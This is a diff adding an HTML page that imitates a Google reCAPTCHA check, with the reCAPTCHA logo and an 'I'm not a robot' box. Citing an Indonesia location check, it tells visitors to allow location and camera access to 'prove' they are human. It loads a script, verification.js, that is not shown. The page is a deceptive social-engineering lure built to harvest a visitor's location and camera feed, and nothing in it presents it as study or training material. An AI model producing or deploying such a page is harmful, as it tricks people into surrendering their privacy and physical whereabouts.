@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA Verification</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="verification.js" defer></script>
+</head>
+<body>
+    <style>
+   ul {
+    list-style: none; /* Hilangin bullet bawaan */
+    padding-left: 0; /* Hilangin padding */
+}
+
+li {
+    display: flex; /* Biar elemen dalam <li> sejajar */
+    align-items: center; /* Biar rata tengah */
+    gap: 23px; /* Tambah jarak antara angka dan teks */
+}
+
+.angka {
+    color: #007BFF; /* Biru mirip dengan gambar */
+    font-size: 1.2em; /* Ukuran angka */
+    font-weight: bold; /* Biar angka lebih tebal */
+    min-width: -50px; /* Tambah ruang untuk angka */
+    text-align: right; /* Biar angka tetap rapi */
+}
+
+.teks {
+    display: flex; /* Biar icon tetap nempel ke teks */
+    align-items: center; /* Sejajarkan icon sama teks */
+    gap: 5px; /* Atur jarak icon dengan teks */
+}
+
+
+    </style>
+    <div class="recaptcha-box">
+        <div class="recaptcha-header">
+            <input type="checkbox" id="recaptcha-checkbox">
+            <label for="recaptcha-checkbox" class="recaptcha-label">
+                <span class="recaptcha-text">I'm not a robot</span>
+            </label>
+            <div class="recaptcha-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" alt="reCAPTCHA">
+            </div>
+        </div>
+
+        <div class="verification-box" id="verification-box">
+            <p>To prove you are located in Indonesia & you are a human, please:</p>
+            <ul>
+                <li>
+                    <span class="angka">1.</span>
+                    <span class="teks">Allow Location <img src="assets/lokasi.png" alt="Lokasi" width="15"> access.</span>
+                </li>
+                <li>
+                    <span class="angka">2.</span>
+                    <span class="teks">Allow Camera <img src="assets/kamera.png" alt="Kamera" width="20"> access.</span>
+                </li>
+            </ul>
+            <p class="user-id">Unique Verification ID: 2155</p>
+            
+            <div class="captcha-loading" id="loading"></div>
+            <button class="verify-button" id="verify-btn">verification</button>
+        </div>        
+
+        <p class="recaptcha-footer">reCAPTCHA - <a href="#">Privacy</a> - <a href="#">Terms</a></p>
+    </div>
+</body>
+</html>
